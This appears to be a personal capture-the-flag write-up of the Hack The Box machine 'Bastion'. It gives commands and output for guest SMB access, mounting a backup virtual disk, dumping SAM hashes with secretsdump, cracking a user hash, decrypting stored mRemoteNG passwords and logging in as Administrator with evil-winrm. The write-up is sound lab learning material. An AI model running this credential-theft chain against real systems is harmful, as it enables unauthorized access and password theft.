---
created: 2025-11-22
---

📅 `2025-11-22`

#smb #backup #virtual-drive #sam #password-cracking

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Bastion`   |
| --------------- | --- |
| 📆 Release Date |  `2019-04-27`   |
| 🌐 IP Address   |  `10.129.136.29`   |
| 🖥️ OS           |  `Windows`   |
| 🎯 Difficulty   |  `Easy`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Guest user access
- `.vhd` files in remote share (virtual hard drives, mount with `guestmount`)
- Dump `SAM` from backup drive (the 3 files in `C:\Windows\System32\config\`, then decrypt with `impacket-secretsdump`)
- `mRemoteNG` admin password decrypt

**🛠️ Tools:**  

- `NetExec`
- `smbclient`
- `impacket-secretsdump`

**📚 Learned:**  

- Mount remote `SMB` share with `mount -t cifs //<ip>/<path> /mnt/<dir>`.
- `sudo guestmount` for mounting `.vhd` files.
- Use a `Python` script to decrypt `base64` encoded passwords in `mRemoteNG`'s config file.

----

## 🌐 Port Scan

- **TCP**: 22, 135, 139, 445, 5985
- **UDP**: None

---

## 🔍 Enumeration

`SMB` null sessions didn't work, but guest access did. Listing the shares revealed a non-default `Backups` share. It had multiple files and folders, but one stood out: `WindowsImageBackup`.

```
$ smbclient \\\\10.129.136.29\\Backups
Password for [WORKGROUP\asdf]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 22 14:53:26 2025
  ..                                  D        0  Sat Nov 22 14:53:26 2025
  dmlShVXqIx.txt                      A        0  Sat Nov 22 13:24:21 2025
  GoVrqdfZjg.txt                      A        0  Sat Nov 22 13:24:05 2025
  iOqbnSBdQW                          D        0  Sat Nov 22 13:24:20 2025
  IxwhWzBoFN                          D        0  Sat Nov 22 13:24:04 2025
  note.txt                           AR      116  Tue Apr 16 05:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
```

I still examined the rest of the files, but nothing was useful, not even the note.

---

## 🪜 Foothold / User

I found 2 `.vhd` files in the folder, and instead of downloading them I used `mount` to mount the remote share.

```shell
sudo mount -t cifs '//10.129.136.29/Backups/' /mnt/backups
```

And then mount the `.vhd` files (one of them was corrupted; I still inspected it with `nanazip`, but it had nothing useful).

```shell
sudo guestmount --add /mnt/backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd1
```

And I can now navigate to `/mnt/vhd1` and inspect the `PC`'s filesystem. I found user `L4mpje`, found nothing in his user folder, so I dumped the `SAM` database instead.

```
# cp SAM /home/asdf/Hacking/Bastion/

# cp SECURITY /home/asdf/Hacking/Bastion/

# cp SYSTEM /home/asdf/Hacking/Bastion/
```

And then as myself, give ownership.

```
$ sudo chown asdf:asdf SAM
$ sudo chown asdf:asdf SECURITY
$ sudo chown asdf:asdf SYSTEM
```

And now dump the hashes.

```shell
$ impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

I tried logging in via `WinRM` using pass-the-hash as `Administrator` and as `L4mpje` but it didn't work. I then cracked `L4mpje`'s hash and got his password.

- `L4mpje`:`bureaulampje`

It didn't work over `WinRM`, but it worked over `SSH`.

```
l4mpje@BASTION C:\Users\L4mpje\Desktop>dir                                                                                      
 Volume in drive C has no label.
 Volume Serial Number is 1B7D-E692
 Directory of C:\Users\L4mpje\Desktop

22-02-2019  15:27    <DIR>          .
22-02-2019  15:27    <DIR>          ..
22-11-2025  19:21                34 user.txt
```

---

## 🛡️ Privilege Escalation

Enumerating the installed programs I found `mRemoteNG`. This program stores its passwords in each user's `AppData/Roaming/mRemoteNG` in a file called `confCons.xml`.

I used a `Python` script I found on `GitHub` that decrypts the `base64` encoded passwords in the file.

```shell
$ python exp.py -s 'yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB'
Password: bureaulampje

$ python exp.py -s 'aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=='
Password: thXLHM96BeKL0ER2
```

The password below should belong to `Administrator`. Let's try it over `WinRM`.

```
$ evil-winrm-py -i 10.129.136.29 -u Administrator -p thXLHM96BeKL0ER2
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.129.136.29:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> cd ../
evil-winrm-py PS C:\Users\Administrator> cd Desktop
evil-winrm-py PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-ar---       11/22/2025   7:21 PM             34 root.txt`
```

Rooted.